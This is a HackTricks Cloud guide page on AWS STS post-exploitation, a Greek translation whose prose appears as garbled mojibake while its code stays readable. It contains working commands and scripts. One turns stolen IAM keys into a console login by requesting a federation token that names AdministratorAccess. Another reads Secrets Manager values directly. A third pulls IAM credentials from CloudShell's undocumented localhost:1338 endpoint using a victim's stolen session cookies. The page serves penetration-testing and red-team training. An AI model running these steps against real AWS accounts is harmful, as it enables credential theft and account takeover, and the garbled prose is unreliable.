# AWS - STS Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## STS

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

#### ÎÎ­Î± ÎœÎ­Î¸Î¿Î´Î¿Ï‚ Î”ÎµÎºÎ­Î¼Î²ÏÎ¹Î¿Ï‚ 2024: Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î‘Ï€Î±Î¹Ï„Î®ÏƒÎµÏ‰Î½ Î³Î¹Î± Î£ÏÎ½Î´ÎµÏƒÎ¼Î¿ Î™ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±Ï‚, ÎœÎµ HTTPS POST Î‘Î¯Ï„Î·Î¼Î± Î£Ï„Î¿ SecretsManager API Î“Î¹Î± Î†Î¼ÎµÏƒÎ· Î‘Ï€ÏŒÎºÏ„Î·ÏƒÎ· ÎœÏ…ÏƒÏ„Î¹ÎºÏÎ½ (Î§Ï‰ÏÎ¯Ï‚ Î£ÏÎ½Î´ÎµÏƒÎ¼Î¿ Î£ÏÎ½Î´ÎµÏƒÎ·Ï‚ Î‰ Î™ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±)

Î¥Ï€Î¿Î²Î»Î®Î¸Î·ÎºÎµ Ï‡Î¸ÎµÏ‚, Ï‰Ï‚ PR Î³Î¹Î± Ï„Î·Î½ ÎµÏ€ÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î· ÎµÎ¾Î­Ï„Î±ÏƒÎ· (ARTE: ex16x41) Ï‰ÏƒÏ„ÏŒÏƒÎ¿ Î²Î»Î­Ï€Ï‰ ÏŒÏ„Î¹ Ï„Î¿ PR Î´ÎµÎ½ ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹, Î¯ÏƒÏ‰Ï‚ Ï…Ï€Î¿Î²Î»Î®Î¸Î·ÎºÎµ Î»Î¬Î¸Î¿Ï‚, Î±Ï‚ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎ¿Ï…Î¼Îµ Î¾Î±Î½Î¬:
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î±Ï…Ï„Î® Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÏ„Îµ ÎµÎ½Ï„ÎµÎ»ÏÏ‚ Ï„Î·Î½ Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· Î³Î¹Î± Î¬Î½Î¿Î¹Î³Î¼Î± Î¿Ï€Î¿Î¹Ï‰Î½Î´Î®Ï€Î¿Ï„Îµ URL, Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¿Ï€Î¿Î¹Ï‰Î½Î´Î®Ï€Î¿Ï„Îµ ÏƒÏ…Î½Î´Î­ÏƒÎ¼Ï‰Î½ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… CLI / Î™ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±Ï‚.
Î¤Î¹ ÎºÎ¬Î½Î±Î¼Îµ Î»Î¿Î¹Ï€ÏŒÎ½ ÎµÎ´Ï;
ÎˆÎ³ÏÎ±ÏˆÎ± Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€Î¿Ï… Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î¼Îµ Ï„Î¿ AWS Secrets Manager API, ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î»ÏÏ„Ï‰Ï‚ Î±Ï€Î»ÏŒ ÎºÎ±Î¹ ÎµÏ…Î¸Ï.
ÎŒÏ„Î±Î½ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Îµ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, ÏƒÏ„Î­Î»Î½ÎµÎ¹ Î­Î½Î± HTTPS POST Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ AWS Secrets Manager endpoint
https://secretsmanager.<region>.amazonaws.com/
Î¤Î¿ Î±Î¯Ï„Î·Î¼Î± GetSecretValue Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹ Ï‰Ï‚ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… POST Î±Î¹Ï„Î®Î¼Î±Ï„Î¿Ï‚, Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Î¼Îµ Ï…Ï€Î¿Î³ÏÎ±Ï†Î® SigV4 (Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿ Î±Ï€ÏŒ Ï„Î¿ boto3).
ÎŸ Secrets Manager Î•Ï€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î¿ Î‘Î¯Ï„Î·Î¼Î±:
Î— AWS ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÎ¹ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ Ï„Î¹Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ­Ï‚ IAM Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½ÎµÏ‚ Î¼Îµ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î® Ï„Î¿Î½ ÏÏŒÎ»Î¿ ÏƒÎ±Ï‚ (ÏŒÏ€Ï‰Ï‚ Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î´Î¿ÏÎ¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… Î¼Ï…ÏƒÏ„Î¹ÎºÎ¿Ï Î¼ÏŒÎ½Î¿ Ï‰Ï‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±)
Î•Î¬Î½ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹, Î· Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Secrets Manager ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Ï„Î·Î½ Î¶Î·Ï„Î¿ÏÎ¼ÎµÎ½Î· Ï„Î¹Î¼Î® Î¼Ï…ÏƒÏ„Î¹ÎºÎ¿Ï ÏƒÏ„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·.
**Î”Î·Î¼Î¿ÏƒÎ¯ÎµÏ…ÏƒÎ· POC:**
Î— ÎµÎ½Ï„Î¿Î»Î® CLI AWS Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… Î¼Ï…ÏƒÏ„Î¹ÎºÎ¿Ï Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÎµÏ€ÎµÎ¹Î´Î® Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Ï€Î¿ÏÏÎ¯Ï€Ï„ÎµÏ„Î±Î¹ ->
Î©ÏƒÏ„ÏŒÏƒÎ¿, ÏƒÏ„Î·Î½ ÎµÎ¹ÎºÏŒÎ½Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ Î±Ï€Î»ÏŒÏ„Î·Ï„Î± Ï„Î·Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… Î³Î¹Î± Î½Î± ÎµÎ¾Î±Î³Î¬Î³ÎµÏ„Îµ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Ï„Î· ÏƒÎ·Î¼Î±Î¯Î± Î³Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ ID Ï„Î¿Ï… Î¼Ï…ÏƒÏ„Î¹ÎºÎ¿Ï (Î±Ï…Ï„ÏŒ Ï„Î¿ ÎµÎ½Î¿Ï€Î¿Î¹Î¿ÏÎ¼Îµ ÏƒÎµ Ï€ÏÏÎ¹Î¼Î¿ ÏƒÏ„Î¬Î´Î¹Î¿ ÏŒÏ„Î±Î½ ÏƒÏ…Î½Î´ÎµÏŒÎ¼Î±ÏƒÏ„Îµ Î¼Îµ Ï„Î¿ Ï€ÏÎ¿Ï†Î¯Î» Ï‡ÏÎ®ÏƒÏ„Î·)
![image](https://github.com/user-attachments/assets/d05a1a96-04c0-4404-b4bd-dbfa93c6494b)
Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: ÎÎ¿Î¼Î¯Î¶Ï‰ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎºÎ±Î¸Î¿Î»Î¹ÎºÎ¬ Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î±Î½ Î· Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ (Î±Î»Î»Î¬ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿ÏÏ‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï€Î¿Ï… Î´ÎµÎ½ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î¼Î­ÏƒÏ‰ CLI)
ÎˆÏ„ÏƒÎ¹, Î±Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¿Ï€Î¿Ï„ÎµÎ´Î®Ï€Î¿Ï„Îµ Î¼Î¹Î± Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ (Ï‰Ï‚ ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® ÎµÏ€Î¹Î»Î¿Î³Î® Î´Î¿ÎºÎ¹Î¼Î®Ï‚)
Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: Ï€ÎµÏÎ¯ÎµÏÎ³Î¿Ï‚ Î³Î¹Î± Î¬Î»Î»ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎµÏ„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Î¯Î´Î¹Î± Î¼Î­Î¸Î¿Î´Î¿ Î¬Î¼ÎµÏƒÎ·Ï‚ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ·Ï‚ Î¼Îµ Ï„Î¿ API Ï„Î·Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ ÎºÎ±Î¹ Ï„ÏÏÎ± Ï„Î¿ AWS CLI, Î³Î¹Î± Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± priv esc Î® post exploitation ÏŒÏ€Ï‰Ï‚ ÎµÎ´Ï.
**ÎšÏÎ´Î¹ÎºÎ±Ï‚:**
'''
Python
import boto3

session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Set a custom User-Agent
client.meta.events.register(
'before-call.secretsmanager.GetSecretValue',
lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'})
)

# Retrieve the secret value directly via secretsmanager API
response = client.get_secret_value(SecretId="flag_sts_lab_3")
print(response['SecretString'])
'''

### Î‘Ï€ÏŒ IAM Î Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Î£Ï„Î· Î™ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÎ¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹ÎµÏ‚ IAM Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÎ±Ï‚ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎµÎ¹ Î½Î± **Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î·Î½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÏÎ³Î±Î»ÎµÎ¯Î±.\
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚/ÏÏŒÎ»Î¿Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`sts:GetFederationToken`**.

#### Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï€ÏÎ¿Ï†Î¯Î» ÎºÎ±Î¹ Î¼Î¹Î± Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î± AWS (ÏŒÏ‡Î¹ gov ÎºÎ±Î¹ ÏŒÏ‡Î¹ cn) Î³Î¹Î± Î½Î± ÏƒÎ±Ï‚ Î´ÏÏƒÎµÎ¹ Î­Î½Î± Ï…Ï€Î¿Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿ URL Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î±Î½ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿ Î¹ÏƒÏ„Î¿Ï ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚** Î¼Îµ [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
Î’ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ IAM Î­Ï‡ÎµÎ¹ Î¬Î´ÎµÎ¹Î± `sts:GetFederationToken`, Î® Ï€Î±ÏÎ­Ï‡ÎµÏ„Îµ Î­Î½Î±Î½ ÏÏŒÎ»Î¿ Î³Î¹Î± Î½Î± Î±Î½Î±Î»Î·Ï†Î¸ÎµÎ¯.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Ï„Î·Î½ Î±ÏƒÏ†Î±Î»Î® Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÎºÎ±Î¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± AWS ÏƒÎµ Î­Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·Ï‚.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ **aws-vault** Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± **ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± ÎºÎ¿Î½ÏƒÏŒÎ»Î±Ï‚ Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ Ï€ÎµÏÎ¹Î®Î³Î·ÏƒÎ·Ï‚**
{% endhint %}

#### Î‘Ï€ÏŒ Ï„Î·Î½ ÎšÎ¿Î½ÏƒÏŒÎ»Î± ÏƒÏ„Î± IAM Creds

[**Î‘Î½Î±ÎºÎ±Î»ÏÏ†Î¸Î·ÎºÎµ Î±ÏÏ‡Î¹ÎºÎ¬ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), Î•Î¬Î½ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÏ„Îµ Î½Î± Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ® ÎºÎ¿Î½ÏƒÏŒÎ»Î± (Î¯ÏƒÏ‰Ï‚ ÎºÎ»Î­ÏˆÎ±Ï„Îµ cookies ÎºÎ±Î¹ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ .aws), Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± IAM token credentials Î³Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… **CloudShell**.

Î¤Î¿ CloudShell ÎµÎºÎ¸Î­Ï„ÎµÎ¹ IAM credentials Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ **Î¼Î· Ï„ÎµÎºÎ¼Î·ÏÎ¹Ï‰Î¼Î­Î½Î¿Ï… endpoint ÏƒÏ„Î·Î½ Ï€ÏŒÏÏ„Î± 1338**. Î‘Ï†Î¿Ï Ï†Î¿ÏÏ„ÏÏƒÎµÏ„Îµ Ï„Î± session cookies Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ ÏƒÏ„Î¿Î½ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î® ÏƒÎ±Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ CloudShell ÎºÎ±Î¹ Î½Î± ÎµÎºÎ´ÏÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ IAM credentials.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
